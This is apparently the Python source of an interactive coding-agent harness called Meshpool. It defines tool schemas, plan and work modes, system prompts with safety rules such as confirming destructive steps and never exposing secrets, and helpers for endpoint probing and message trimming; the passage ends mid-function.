"""Meshpool coding agent: an interactive conversation in a project folder.

Unlike the one-shot harness (`meshpool run`), the agent keeps the whole conversation, answers in plain text when it
is done with a request, and waits for the next one. It reuses the harness's file and shell tools (Workspace), its
transport (any OpenAI-compatible endpoint, streamed), its model profiles, and adds MCP tools and permission prompts.

Front ends (terminal, web app) talk to it through two callbacks:
  emit(event: dict)                      every step, as it happens (text deltas, tool calls, usage, errors)
  approve(kind, title, detail) -> (decision, note)   decision in {"yes", "always", "no"}
"""
from __future__ import annotations

import contextvars
import copy
import datetime
import difflib
import http.client
import itertools
import json
import os
import platform
import re
import threading
import time
import urllib.error
import urllib.request
import uuid
from pathlib import Path

from meshpool_harness import pace as PACE
from meshpool_harness import session_store as SS
from meshpool_harness.agent.history_repair import repair_tool_pairs
from meshpool_harness.agent import ask as ASK
from meshpool_harness import config as C
from meshpool_harness.core import gateway as GW
from meshpool_harness.core import http as _mhttp
from meshpool_harness.core import permrules as PR
from meshpool_harness.core import tools as T
from meshpool_harness.core import usage
from meshpool_harness.core.client import (_reply_chars, _withhold_latest_output, classify_error, rate_limit_wait,
                                          stated_wait)
from meshpool_harness.core.loop import _compact, _sanitize_calls
from meshpool_harness.core.tools import ToolError, Workspace, clean, validate
from meshpool_harness.core import stream as ST
from meshpool_harness.core.wire import sse_to_chat
from meshpool_harness.harnesses.safe_tools import SAFE_MCP
from meshpool_harness.agent import mcp_assist as MA

SESSIONS = C.runs_dir() / "sessions"
DEFAULT_MODEL = "deepseek-v4.1-flash"

READ_ONLY = {"bash_output", "bash_stop", "read_file", "grep", "glob", "fetch_url", "office_task", "web_search", "web_research", "todo_write", "use_skill",
             "ask_user", "diagnostics", "find_skill", "update_plan", "mcp_find_tools"}
# MCP tools that change nothing: the only ones plan mode runs (SAFE_MCP, which skips the approval prompt, also has
# tools that save or schedule things).
PLAN_MCP = {"mcp__meshpool_web__web_search", "mcp__meshpool_web__web_fetch", "mcp__meshpool_web__web_research",
            "mcp__meshpool_assistant__memory_view", "mcp__meshpool_assistant__list_scheduled_tasks",
            "mcp__meshpool_assistant__search_chats", "mcp__meshpool_office__read_document",
            "mcp__meshpool_office__office_job_status", "mcp__meshpool_tools__current_time",
            "mcp__meshpool_tools__calculate", "mcp__meshpool_office__check_deck",
            "mcp__meshpool_office__check_workbook", "mcp__meshpool_office__measure_office_file",
            "mcp__meshpool_office__check_document", "mcp__meshpool_office__find_icon",
            "mcp__meshpool_office__slide_layouts"}
PLAN_TOOLS = ["read_file", "grep", "glob", "fetch_url", "web_search", "web_research", "todo_write", "use_skill",
              "ask_user"]
BUILTIN = ["read_file", "grep", "glob", "edit", "notebook_edit", "write_file", "bash", "bash_start", "bash_output", "bash_stop", "bash_many", "fetch_url", "web_search",
           "web_research", "todo_write", "use_skill", "ask_user"]
# Harness v3 (benchmarked 2026-11-12, run C): bash_many, todo follow-through, loop and stall breakers, a turn-budget
# note and an environment snapshot. MH_AGENT_V3=0 turns them off.
V3 = os.environ.get("MH_AGENT_V3", "1") != "0"
if not V3:
    BUILTIN.remove("bash_many")
if os.environ.get("MH_OBSERVE") == "1":           # probe/trace: see the bug before editing (core/observe.py)
    BUILTIN[BUILTIN.index("bash") + 1:BUILTIN.index("bash") + 1] = ["probe", "trace"]
WORK_TOOLS = BUILTIN + ["office_task"]
PROJECT_FILES = ("MESHPOOL.md", "AGENTS.md", "CLAUDE.md")


SCRATCH_RULE = ("\n\nPut scratch files (check scripts, repro copies, notes) in $TMPDIR, which is private to this task, "
                "never in a fixed /tmp path that another task could also be using.")


def _lean_work_on() -> bool:
    """Work chats run as lean core too (on by default since work1: 45/54 at 0.61x Codex's cost per solved task, against
    43/54 at 1.08x for the full Cowork lane; MH_LEAN_WORK=0 restores the full lane; docs/design/lean-core.md), with the
    Work section of prompt-work.md and the office and web tools in LEAN_WORK_TOOLS."""
    return os.environ.get("MH_LEAN_WORK", "1") != "0"


def _office_direct_on() -> bool:
    """On by default (MH_OFFICE_DIRECT=0 turns it off): a lean Work chat does office-file edits and small files itself
    with python-docx, openpyxl or python-pptx, as Codex does, and gets the office engines only for a new deck, report
    or model. office3 (bench3 office 7, SpreadsheetBench 6, OfficeBench 4, x2 vs Codex): 13/14, 10/12, 8/8 at 1.5-1.7x
    Codex's cost per solved task, against 10/14, 8/12, 7/8 at 2.2-2.4x through the engines."""
    return os.environ.get("MH_OFFICE_DIRECT", "1") != "0"


# SpreadsheetBench, frozen round on 1c0b6df5: all three losses had a last check that showed the defect (the same
# SUMPRODUCT total for two criteria, a totals row the delete rule matched left in, its own failed assertion), and the
# agent explained the check away; Codex applied the rule to every matching row.
OFFICE_DIRECT_RULE = ("- For an office-file job (edit or derive from an existing .docx, .xlsx or .pptx: sort, filter, "
                      "fill, add a column, a chart or a slide, convert, extract; or a small new file), write it "
                      "yourself in one Python script with python-docx, openpyxl or python-pptx, keeping the source's "
                      "sheets, layout and styles unless asked otherwise; save it, then reopen the file to check what "
                      "the request asks for (a formula change is checked by reading the formula text, not by recalculating; "
                      "a year, date or label the request names stays a literal value in the formula, never TODAY(), "
                      "NOW() or YEAR(TODAY()); "
                      "recalculate through LibreOffice only when the request asks for computed values). When that check disagrees with the request (a failed "
                      "assertion, the same result for different inputs, a row the rule matches still there), the file "
                      "is wrong: fix the file, not the check, and apply the user's rule to every row it matches. "
                      "office_task is listed only when a request asks for a new deck, "
                      "report or financial model; use it then for that deliverable.")

LEAN_WORK_TOOLS = ["office_task", "web_research", "fetch_url"]   # a lean Work chat's tools beyond Codex's three
# MH_OFFICE_DIRECT=1: the tools that run an office engine's own model loop (office_task, and the office server's
# make_* / add_slides / analyze_data). Offered only once a message asks for a new styled deliverable
# (office_intent.styled_deliverable), and then last in the list, so offering them appends and never reorders.
ENGINE_MCP = ("make_deck", "make_spreadsheet", "make_document", "make_pdf", "add_slides", "analyze_data")


def _engine_tool(name: str) -> bool:
    n = name.replace("-", "_")
    return n == "office_task" or (n.startswith("mcp__meshpool_office__") and n.rsplit("__", 1)[-1] in ENGINE_MCP)


def _codex_prompt(lean: bool = False, work: bool = False) -> str:
    """Codex's base instructions (app/defaults/engines/codex/prompt.md, Apache-2.0, see its NOTICE comment, which is
    for readers of the file and is not sent to the model). lean: the short codex-tuned prompt (prompt-core.md).
    work: plus the Work section (prompt-work.md: data answers, office files, web lookups)."""
    text = _codex_base(lean)
    if work:
        try:
            add = (C.APP / "defaults" / "engines" / "codex" / "prompt-work.md").read_text(encoding="utf-8")
            add = re.sub(r"\A\s*<!--.*?-->\s*", "", add, count=1, flags=re.S).rstrip()
            if _office_direct_on():
                add = re.sub(r"^- To make a \.docx.*$", lambda _m: OFFICE_DIRECT_RULE, add, count=1, flags=re.M)
            text += "\n\n" + add
        except OSError:
            pass
    return text


def _c171_prompt() -> str:
    """Codex CLI 0.171's base instructions (app/defaults/engines/codex/prompt-171.md, Apache-2.0): the text after the
    NOTICE comment, exactly as the file has it (the comment is for readers of the file and is not sent)."""
    try:
        text = (C.APP / "defaults" / "engines" / "codex" / "prompt-171.md").read_text(encoding="utf-8")
    except OSError:
        return _codex_base()
    return re.sub(r"\A<!--.*?-->\n", "", text, count=1, flags=re.S)


def _local_timezone() -> str:
    """The IANA name of this computer's time zone, as Codex's <timezone> gives it (Etc/UTC when it cannot tell)."""
    tz = (os.environ.get("TZ") or "").lstrip(":").strip()
    if tz and "/" in tz and not tz.startswith("/"):
        return tz
    try:
        link = os.path.realpath("/etc/localtime")
        if "zoneinfo/" in link:
            return link.split("zoneinfo/", 1)[1].replace("posix/", "", 1).replace("right/", "", 1)
    except OSError:
        pass
    try:
        name = Path("/etc/timezone").read_text(encoding="utf-8").strip()
        if name:
            return name
    except OSError:
        pass
    return "Etc/UTC"


def _codex_base(lean: bool = False) -> str:
    if lean:
        alt = os.environ.get("MH_CORE_PROMPT_FILE", "")      # A/B switch: a whole replacement lean prompt
        if alt:
            try:
                return re.sub(r"\A\s*<!--.*?-->\s*", "", Path(alt).read_text(encoding="utf-8"), count=1, flags=re.S).rstrip()
            except OSError:
                pass
        try:
            text = (C.APP / "defaults" / "engines" / "codex" / "prompt-core.md").read_text(encoding="utf-8")
            text = re.sub(r"\A\s*<!--.*?-->\s*", "", text, count=1, flags=re.S).rstrip()
            return text if "$TMPDIR" in text else text + SCRATCH_RULE
        except OSError:
            pass
    try:
        text = (C.APP / "defaults" / "engines" / "codex" / "prompt.md").read_text(encoding="utf-8")
    except OSError:
        return "You are a coding agent. Use the shell and apply_patch tools to complete the user's task."
    text = re.sub(r"\A\s*<!--.*?-->\s*", "", text, count=1, flags=re.S)
    if os.environ.get("MH_CODEX_PROMPT") == "full":
        return text
    text = _trim_codex(text)
    text += SCRATCH_RULE
    if os.environ.get("MH_FINISH_CHECK", "0") != "1":      # MH_FINISH_CHECK=1: re-check each requirement before the answer
        text = re.sub(r"## Before you finish\n.*?\n\n", "", text, count=1, flags=re.S)
    if os.environ.get("MH_OUTPUT_RULES", "0") == "1":      # MH_OUTPUT_RULES=1: fewer output tokens (patches and scripts are most of them)
        text = text.rstrip() + ("\n\nKeep output small: change existing files with apply_patch, never by rewriting them; "
                               "a throwaway check is at most a few lines, and the project's own tests come first; do not "
                               "restate the plan or repeat code you already wrote.\n")
    if os.environ.get("MH_SCAN_RULE", "0") == "1":         # MH_SCAN_RULE=1: no whole-file-system scans, no sandbox copies
        text = text.rstrip() + ("\n\nTest with the project's own tests or a short script in the project; do not scan the "
                               "file system (`find /`) or copy the project elsewhere to test it.\n")
    return text


_TRIM = (
    # (start heading, end heading, replacement): what the model does not need on every call. The examples of
    # preambles and plans and the long answer-formatting rules cost about 2.5k tokens per call and made the model
    # write a sentence before each tool call and long final answers.
    ("# AGENTS.md spec\n", "## Responsiveness\n",
     "# AGENTS.md\nA project's AGENTS.md (any folder) holds its conventions and is binding for the files you touch; "
     "the one at the project root is already included below.\n\n"),
    ("## Responsiveness\n", "## Planning\n",
     "## Responsiveness\nDo not write a sentence before tool calls: just call the tools. Write only the final "
     "answer.\n\n"),
    ("### Examples\n", "## Task execution\n", ""),
    ("## Sharing progress updates\n", "## Presenting your work and final message\n",
     "## Before you finish\nRe-read the request. For each requirement, check your code or a run against its exact "
     "words: the keys and values returned, empty and single-item inputs, ordering, errors. A requirement you only "
     "assumed is not done; fix what fails, then answer.\n\n"),
    ("### Final answer structure and style guidelines\n", "# Sandbox and approvals\n",
     "### Final answer style\nPlain text. At most 10 lines: what changed and how you checked it, nothing else. "
     "Do not restate the task, list every edit, or paste code you wrote. Use `-` bullets and backticks for "
     "commands, paths and identifiers; no headers for short answers.\n\n"),
)


def _trim_codex(text: str) -> str:
    for a, b, new in _TRIM:
        i = text.find(a)
        j = text.find(b, i + len(a)) if i >= 0 else -1
        if i >= 0 and j > i:
            text = text[:i] + new + text[j:]
    return text

T.SCHEMAS.setdefault("ask_user", ASK.SCHEMA)
from meshpool_harness.agent import planning as _PLAN  # noqa: E402
from meshpool_harness.hrouter import packs as _PACKS  # noqa: E402  language packs: the diagnostics tool
T.SCHEMAS.setdefault("diagnostics", _PACKS.SCHEMA)
T.SCHEMAS.setdefault("find_skill", T._fn(
    "find_skill", "Search the user's skills (saved instructions for specific jobs) by a few words describing the task. "
    "Returns the best matches with their descriptions; load one with use_skill.", {"query": T.S}, ["query"]))
T.SCHEMAS.setdefault("use_skill", T._fn(
    "use_skill", "Load a skill's full instructions by name (from the skills list in your instructions). Do this before "
    "a task that matches a skill, and whenever the user writes $skill-name.", {"name": T.S}, ["name"]))
_REC = {"type": "string", "enum": ["", "day", "week", "month", "year"], "description": "Only recent results"}
T.SCHEMAS["fetch_url"] = T._fn(
    "fetch_url", "Read a web page, PDF or Office file from a URL as clean text (title, date, main content). Long pages "
    "come in parts: call again with start to read on. Use this, not the browser, for public pages.",
    {"url": T.S, "start": {"type": "integer", "description": "Character offset to read from"},
     "max_chars": {"type": "integer", "description": "Default 15000"},
     "links": {"type": "boolean", "description": "Also list the page's links"}}, ["url"])
T.SCHEMAS["web_research"] = T._fn(
    "web_research", "Research a question in one step: runs several searches in parallel, reads the best sources in "
    "parallel and returns the passages that answer it, numbered with links for citing. Give 2 to 5 varied queries for "
    "broad questions; call again with new queries to fill gaps.",
    {"question": T.S, "queries": {"type": "array", "items": T.S},
     "max_sources": {"type": "integer", "description": "2 to 12, default 6"}, "recency": _REC, "site": T.S}, ["question"])

SYSTEM = """You are Meshpool, a coding agent. You work in the user's project folder on their own computer, through \
tools. The user sees every tool call you make.

Environment
- Project folder: {root}
- Operating system: {os_name}
- Shell for the bash tool: {shell}

How to work
1. Look before you change anything: use glob, grep and read_file to understand the code.
2. For work with several steps, keep a short plan with todo_write and update it as you go.
3. Make focused changes. Use edit for existing files: read the file first and copy `old` exactly, without the \
line-number prefix. Use write_file for new files.
4. Check your work: run the tests, the build, or the script with bash, and fix what fails.
5. Do what was asked, nothing more. If the request is unclear in a way that changes what you build, ask with \
ask_user (short options, your recommendation marked) instead of guessing; look up what you can find yourself first.
6. When you finish a request, reply with a short summary of what you changed and how you checked it, without \
calling a tool. That reply ends your turn; the user then answers or gives the next request.

Rules
- Paths are relative to the project folder. You can only write inside it.
- Never print or store secrets such as API keys or tokens.
- Ask before destructive steps (deleting files, force-pushing, dropping data) unless the user asked for them.
- If the user denies a tool call, do not retry it. Take another approach or ask.
- Long outputs are cut. The full text is saved to a file you can read.
- Tools whose names start with mcp__ come from MCP servers the user connected. Use them when they fit.
- To look things up, use web_search, web_research and fetch_url. They are fast and need no browser. Match the depth to the request: a quick question gets one web_research call and a short answer with links; for a research job or report, run web_research with several varied queries, read key sources in full with fetch_url, and cite every fact with its link.
- If a value in the user's message arrives as a tag like [redacted: phone number #1], PHONE_NUMBER_1 or EMAIL_ADDRESS, it was hidden for privacy. Never invent or use an example value in its place; leave it out and tell the user where to add it.
- Anything with a visual result (a web page, app screen, slide, chart, document, image) you must look at before you say it is done. Open the result with view_output (any file) or ui_audit (a web page: wide, tablet and phone, light and dark), read the report and the pictures, fix what is wrong, and check again. For a new web page or app screen, read the build-ui skill first. For anything you build as code (app, game, dashboard, script, CLI, API), read the matching build skill (build-app, build-game, build-dashboard, build-website, build-code), write the list of features a user expects as your plan, use it like a user before you finish (ui_smoke for pages, real runs and tests for programs), and fix what breaks.
- Use the browser tools (if enabled) only for pages that need a sign-in, clicks or forms. Use computer use only for desktop apps, and only when the user asks for it. Files, commands and APIs beat clicking. Before anything irreversible on a website or in an app (sending, paying, deleting, submitting), stop and confirm with the user.
- Write plainly: short sentences, no filler. Use Markdown code blocks for code.
- Between tool calls write nothing, or one short line when it helps: the user sees every call. Do not restate what a \
tool returned or what you are about to do at length."""

V3_RULES = """

Working efficiently
- When you need several independent facts, ask for them in the same turn: several read_file, grep, glob or fetch \
calls in one message run at the same time, and bash_many runs several shell commands in one call. One fact per turn \
is the slowest way to work.
- For any request with more than one step, list its concrete requirements and your steps with todo_write first, and \
mark items completed as you go. Before you end your turn, every item should be completed, or say why it is not."""


# ---- E2E-AUTONOMY (0.0.12): finishing the whole job, MCP use, errors, verification. MH_E2E=0 turns it off. ----
E2E_RULES = """

Finishing the job
- Finish the whole task yourself, in this turn. Do not stop to ask permission for the next step, and do not end \
your reply with a promise ("I will now...", "Next I would..."): do the next step with a tool call instead. A reply \
without a tool call ends the turn, so only send one when the work is done or you are truly blocked.
- Ask the user (ask_user) only when you are truly blocked: a secret or access only they have, an action you cannot \
undo that they did not ask for, or two readings that lead to very different results which no file or tool can \
settle. For everything else pick the sensible default, go on, and say what you assumed in your final reply.
- A failed tool call is information, not the end. Read the whole message, fix what it names (a wrong or missing \
argument, a format, a step to do first) and call again. Retry a temporary failure (timeout, 5xx, rate limit) up to \
three times. Try a different tool or approach before you report something as impossible. A result that says \
ok false, error or failed is a failure even when the call itself did not error.
- Connected-app tools (names starting mcp__): find the right tool by reading the tool list (or mcp_find_tools when \
it is offered); look ids up with a search or list tool instead of guessing them; follow every next page \
(next_cursor, page, offset) until none is left; join data from several tools by id; and then do the write steps \
the user asked for. A summary is not the job when they asked for a change.
- Never repeat a call that already succeeded and created or changed something (a booking, an invoice, a message): it \
would be done twice. To check it, read.
- To check your work, only look: read the file, run the tests, call a read-only tool. Never test by doing extra \
real things in a live system (booking, sending, creating, updating or deleting something just to see if it \
works). If an effect cannot be read back, say it was accepted by the tool but is not independently confirmed.
- Before you finish, go through every requirement in the request one by one against the real result. Say plainly \
what failed or was not done; never write "done" for something that errored."""
E2E = os.environ.get("MH_E2E", "1") != "0"


T.SCHEMAS["web_search"] = T._fn(
    "web_search", "Search the web and get the top results (title, link, snippet). Then read pages with fetch_url, or "
    "use web_research to search and read in one step.",
    {"query": T.S, "max_results": {"type": "integer"}, "recency": _REC,
     "site": {"type": "string", "description": "Limit to one site"}}, ["query"])
T.SCHEMAS.setdefault("todo_write", T._fn(
    "todo_write", "Keep a short plan for multi-step work. Send the whole list each time with each item's status. "
    "The user sees it as a checklist.",
    {"items": {"type": "array", "items": {"type": "object", "properties": {
        "content": T.S, "status": {"type": "string", "enum": ["pending", "in_progress", "completed"]}},
        "required": ["content", "status"]}}}, ["items"]))
T.SCHEMAS.setdefault("office_task", T._fn(
    "office_task", "Hand a document job to Meshpool's office engines and get the finished file back. Use it for "
    "slide decks (.pptx), spreadsheets and financial models (.xlsx), and data analysis with charts. Describe the "
    "whole deliverable in `request`; list input files from the project folder in `files`.",
    {"engine": {"type": "string", "enum": ["slides", "sheets", "data"]}, "request": T.S,
     "files": {"type": "array", "items": T.S},
     # the deck brief (engine slides; engines/forge/brief.py): what is not given is asked, or recommended
     "audience": {"type": "string", "description": "slides: who the deck is for"}, "purpose": T.S,
     "density": {"type": "string", "enum": ["present", "balanced", "read"],
                 "description": "slides: present (visual, few words, to present live), balanced, read (dense pre-read)"},
     "slides": {"type": "integer", "description": "slides: number of slides"},
     "theme": {"type": "string", "description": "slides: navy, ocean, forest, burgundy, graphite or mono"},
     "opening": T.S, "closing": T.S, "sources": T.S,
     "brief_ok": {"type": "boolean", "description": "slides: build now with the recommended answers to anything "
                                                    "not given, without asking"}}, ["engine", "request"]))

WORK_SYSTEM = """You are Meshpool Cowork, an assistant that does real work for the user on their own computer: \
research, writing, analysis, spreadsheets, presentations and file housekeeping. You work through tools, and the user \
sees every tool call.

Environment
- Working folder: {root}
- Operating system: {os_name}
- Shell for the bash tool: {shell}

How to work
0. Match the effort to the request. A question, a rewrite or a quick lookup gets a direct answer, with a tool only \
when the answer needs a file, a current fact or an action. Only a real deliverable gets the full process below. \
Do the asked thing first, at the size asked: ONE deliverable unless the user asked for more. Do not add a plan \
document, a tracker or workbook, a summary file, a PDF copy or extra versions on the side. What fits on a screen \
goes in your reply (a table, a short plan, post copy, a reply email); make a file only when the user wants one or the \
result is long, and then one file in one format. A vague request gets a sensible first version with your assumptions \
listed, not questions and not a research project. Research only as deep as the request needs: a few sources, then \
write; stop once each fact you will state has a source. A skill is a guide, not a checklist: skip any step the \
request does not need, and never let it add deliverables the user did not ask for. Ask only when truly blocked.
1. Understand the job. Ask only when a choice that changes the result is open (see "Asking the user" below).
2. For a multi-step job, keep a short plan with todo_write and update it as you go.
3. Gather material: read the user's files (read_file, glob, grep), research the web with web_research and \
web_search, read pages and PDFs with fetch_url, and use connected apps (mcp__ tools) when they fit. For a big \
research job, split it into parts, research each, then write up.
4. When a file is the right deliverable (see 0), make it in the working folder. For decks, spreadsheets, models and data analysis use \
office_task: it returns a finished, checked file. For memos, reports, letters and proposals make a Word document \
(.docx) with the make_document tool (or python-docx through bash for edits to an existing .docx); write Markdown only \
when the user asks for it. Use Python through bash for quick calculations.
5. Check the result: open what you made, verify numbers against their sources, and fix problems before you finish. \
Research budget: when the request or its files already hold sourced research, use it and only look up what they \
mark as a gap; otherwise prefer a few authoritative sources (filings, the company's releases) over many pages, and \
stop researching once each number you need has a source. To change text, cells, comments or tracked changes in a Word, Excel or PowerPoint file the user already has, call edit_office_file (it keeps their formatting; never rewrite the file's XML by hand). Never build a deck or a workbook yourself with python-pptx or openpyxl when make_deck, make_spreadsheet or \
office_task can make it: the engines carry the design system and the checks. To add or change slides in a deck the \
user already has, use add_slides (it builds them in that deck's look and keeps the original): never write slides \
with python-pptx code. If an engine call returns a job id, \
wait for it with office_job_status. If its result has a problem, call it again with the specific fix in the request \
(e.g. "exactly 10 slides; merge the two risk slides"). Run check_deck on every .pptx, check_workbook on every .xlsx \
and check_document on every .docx you deliver; fix each failure it lists (content \
failures by changing the words or numbers, then rebuild) and tell the user about any that remain. Rebuild at most \
twice to clear check results; failures marked /renderer are the engine's own and a rebuild does not fix them.
6. Finish with a short reply: what you made, where the files are, and anything the user should check. Do not call \
a tool in that reply.

Answer style
- Lead with the answer or the result in the first sentence. No preamble ("Great question", "Sure, I can help"), \
no restating the request, no closing recap of what you just said, no offers of further help unless one is useful.
- Be as short as the content allows: a quick question gets one to four sentences or a tight list. Use headings \
and tables only for long or structured answers.
- Do not narrate your tool calls; the user already sees them. Between tool calls write nothing, or one short line \
when it helps the user follow along.

Asking the user (ask_user)
The user wants the result they had in mind, not a good guess. ask_user shows them clickable options; they can also \
type their own answer.
- E2E-AUTONOMY: build now with sensible choices. Make ONE ask_user call before a large deliverable (deck, workbook, \
long document, report) only if a choice that would waste the whole job when wrong is open and nothing in the \
request, the files or the connected apps settles it: at most 3 questions. A vague request ("a plan for X") is not a \
reason to ask: choose audience, length and format yourself and list them in one line at the end. Waiting on questions costs the user time; ask only what you cannot reasonably choose. Typical ones: \
audience and purpose; density, with the options "present" (visual, few words, to present live), "balanced" and \
"read" (a dense pre-read); length (e.g. number of slides or pages); look or theme (navy, ocean, forest, burgundy, \
graphite, mono); sources to use or leave out. Give every question 2 to 5 short options, mark the one you recommend \
with recommended: true, and say in its description what it means for the result.
- Skip any question the request or the files already answer. Look facts up (files, web, connected apps) instead of \
asking for them. A quick question or a small, clear task needs no questions.
- While you work, ask a short follow-up whenever something material is ambiguous (two readings of the data, a \
missing number, a choice the user would care about). Never make two ask_user calls in a row without doing work in \
between.
- E2E-AUTONOMY: do not ask at the end to confirm what you assumed; list the assumptions in your reply.
- Pass the answers on to the engines in plain words: put them in the make_deck, make_spreadsheet, make_document or \
office_task request (e.g. "density: present", "ocean theme", "exactly 8 slides", "audience: the board").
- If the result says no one answered, go ahead with your recommendations and list them as assumptions in your reply.
- If make_deck answers "BRIEF NEEDED", ask its questions (keep its options and recommendations) in one ask_user call, \
then call it again with the answers as fields. If you already asked them, pass brief_ok=true.

Rules
- Copy values the request gives (dates, amounts, labels, names) exactly as written, unless it asks you to reformat them: do not rewrite an ISO date, add a note such as "(excl. VAT)" or round a figure the user gave.
- Save a result at the exact path and file name the request names (for example ./deck.pptx); use the Meshpool outputs folder only when it names none.
- To fill in or change a workbook, document or deck the user already has, use edit_office_file with direct edits (cell references such as Assumptions!B2 on the named sheets); build with an engine only for a new file.
- Use facts from the user's files and fetched sources. Never invent numbers, quotes or sources; say what is missing.
- You can only write inside the working folder. Ask before deleting or overwriting the user's files.
- Never print or store secrets such as API keys or tokens.
- If the user denies a tool call, do not retry it. Take another approach or ask.
- To look things up, use web_search, web_research and fetch_url. They are fast and need no browser. Match the depth to the request: a quick question gets one web_research call and a short answer with links; for a research job or report, run web_research with several varied queries, read key sources in full with fetch_url, and cite every fact with its link.
- If a value in the user's message arrives as a tag like [redacted: phone number #1], PHONE_NUMBER_1 or EMAIL_ADDRESS, it was hidden for privacy. Never invent or use an example value in its place; leave it out and tell the user where to add it.
- Anything with a visual result (a web page, app screen, slide, chart, document, image) you must look at before you say it is done. Open the result with view_output (any file) or ui_audit (a web page: wide, tablet and phone, light and dark), read the report and the pictures, fix what is wrong, and check again. For a new web page or app screen, read the build-ui skill first. For anything you build as code (app, game, dashboard, script, CLI, API), read the matching build skill (build-app, build-game, build-dashboard, build-website, build-code), write the list of features a user expects as your plan, use it like a user before you finish (ui_smoke for pages, real runs and tests for programs), and fix what breaks.
- Use the browser tools (if enabled) only for pages that need a sign-in, clicks or forms. Use computer use only for desktop apps, and only when the user asks for it. Files, commands and APIs beat clicking. Before anything irreversible on a website or in an app (sending, paying, deleting, submitting), stop and confirm with the user.
- Write plainly: short sentences, no filler."""


def _set_read_timeout(resp, seconds: float) -> None:
    """Change the read timeout of an open urllib response (CPython keeps the socket at fp.raw._sock)."""
    try:
        resp.fp.raw._sock.settimeout(seconds)
    except Exception:  # noqa: BLE001  another runtime or a test double: keep the timeout it was opened with
        pass


class _Track:
    """urllib handler mixin: hand each new connection to a callback, so Stop can shut its socket even while the
    request is still waiting for the response headers (a gateway that never answers)."""
    def __init__(self, sink, *a, **kw):
        super().__init__(*a, **kw)
        self.sink = sink

    def do_open(self, http_class, req, **kw):
        sink = self.sink

        def make(host, **k):
            c = http_class(host, **k)
            sink(c)
            return c
        return super().do_open(make, req, **kw)


class _TrackHTTP(_Track, urllib.request.HTTPHandler):
    pass


class _TrackHTTPS(_Track, urllib.request.HTTPSHandler):
    pass


_ABORT: contextvars.ContextVar = contextvars.ContextVar("meshpool_abort", default=None)   # see _post_slotted


class _EndpointDown(RuntimeError):
    """The endpoint stayed down for the whole recovery wait: report it, do not wait again."""


def _urlopen(req, timeout: float, sink):
    """urllib.request.urlopen with the connection handed to sink (proxies from the environment as usual)."""
    from meshpool_harness.core import endpoint as _EP
    # one keyed-request implementation (core/http.py via endpoint.urlopen): same-host redirects only, loopback never
    # through a proxy, the shared TLS context; a redirect to another host surfaces as an HTTP error, key unsent
    return _EP.urlopen(req, timeout, (_TrackHTTP(sink), _TrackHTTPS(sink, context=_mhttp.tls_context())))


def _is_local_base(base: str) -> bool:
    from meshpool_harness.core import modelcaps as _MCL
    return _MCL.is_local(base)


def _probe_once(base: str, key: str, model: str, sink=None, timeout: float | None = None) -> str:
    """One tiny request: "ok" when the endpoint answers (any reply below 502), "auth" on 401/403, else the error.
    A 500 is an answer (the gateway is serving, this model or request failed); 502/503/504 mean it is not serving."""
    body = {"model": model, "max_tokens": 1, "messages": [{"role": "user", "content": "ping"}]}
    from meshpool_harness import providers as _PV
    from meshpool_harness.core import endpoint as _EP            # URL, key header and body fields: core/endpoint.py
    if _PV.wire_for(base) == "anthropic":          # the Messages API (see Agent._post)
        from meshpool_harness.core import anthropic_wire as AW
        body = AW.to_request(body)
        url, hdrs = _PV.chat_target(base, key, model, "messages")
    else:
        url, body, hdrs = _EP.chat_request(base, key, body)
        hdrs = _PV.custom_auth(hdrs, base, key)
    hdrs = {**hdrs, "Content-Type": "application/json"}
    req = urllib.request.Request(url, data=ST.encode_body(body), method="POST", headers=hdrs)
    try:
        from meshpool_harness.core import modelcaps as _MCP
        body_s = float(os.environ.get("MH_PROBE_S", "30"))
        t = _MCP.probe_timeout(base, body_s)            # a local server may be loading a model: a longer first-byte wait
        if timeout:
            t = min(t, float(timeout))                  # a caller with a shorter first-byte wait (core/wire.py)
        with (_urlopen(req, t, sink) if sink else _EP.urlopen(req, t)) as r:
            ST.read_body(r, min(t, body_s))             # a total deadline (not stretched for local loading): a body that trickles keep-alives ends too
        return "ok"
    except urllib.error.HTTPError as e:
        return "auth" if e.code in (401, 403) else "ok" if e.code < 502 else f"HTTP {e.code}"
    except Exception as e:  # noqa: BLE001
        from meshpool_harness.core import refusals as _RF
        return ("tls: " if _RF.is_tls_error(str(e)) else "") + f"HTTP 0: {_mhttp.explain(e, url)}"


def _image_in_newest_ask(messages: list) -> bool:
    """Whether the newest message the user typed (not a tool's screenshot, not a Meshpool note) carries an image."""
    for m in reversed(messages):
        if m.get("role") != "user":
            continue
        c = m.get("content")
        text = c if isinstance(c, str) else " ".join(str(p.get("text") or "") for p in c or []
                                                       if isinstance(p, dict) and p.get("type") == "text")
        if text.startswith(("Image returned by", "[Meshpool]")):
            continue                                    # attached by a tool (_attach_images) or a harness note
        return isinstance(c, list) and any(isinstance(p, dict) and p.get("type") == "image_url" for p in c)
    return False


def _cut_long_user_text(messages: list, keep: int = 40000) -> bool:
    """Shorten user messages over `keep` characters to their start and end, with a note in the middle. A message too
    big for the endpoint otherwise goes with every later request too and the chat cannot recover. True if cut."""
    def shorten(c: str) -> str:
        return (c[:keep * 3 // 4] + f"\n\n[... {len(c) - keep} characters left out: the message was too large for "
                "the endpoint ...]\n\n" + c[-keep // 4:])
    cut = False
    for m in messages:
        c = m.get("content")
        if m.get("role") != "user":
            continue
        if isinstance(c, str) and len(c) > keep:
            m["content"], cut = shorten(c), True
        elif isinstance(c, list):                       # text sent along with an image
            for p in c:
                if isinstance(p, dict) and p.get("type") == "text" and len(str(p.get("text") or "")) > keep:
                    p["text"], cut = shorten(str(p["text"])), True
    return cut


def _subagents_on() -> bool:
    try:
        from meshpool_harness import assistant as AS
        return AS.subagent_settings()["on"]
    except Exception:  # noqa: BLE001
        return False


def _lighten(messages: list) -> None:
    """After an outage: elide older tool outputs only when the conversation is very large (over 150k characters),
    keeping the last eight verbatim. Smaller conversations are left whole, so a long task keeps its context."""
    if _context_size(messages) > 150000:
        _compact(messages, keep_recent=8)


RESUME_NOTE = ("\n\n\u200b[Meshpool] Your previous turn was cut off by an error (such as a rate limit or a lost "
               "connection) before you finished. Unless this message asks for something else, pick the task up exactly "
               "where it stopped: the tool calls and results above are what was already done, so do not redo finished "
               "steps or start over.")


def _rate_limit_budget() -> float:
    """How long one model call waits out rate limits before the turn ends (MH_RATE_LIMIT_WAIT_S, 30 min)."""
    try:
        return max(0.0, float(os.environ.get("MH_RATE_LIMIT_WAIT_S", "1800")))
    except ValueError:
        return 1800.0


def _dur(s: float) -> str:
    s = int(round(s))
    return f"{s} s" if s < 90 else f"{round(s / 60)} min" if s < 5400 else f"{s / 3600:.1f} h"


def _retry_text(msg: str, attempt: int) -> str:
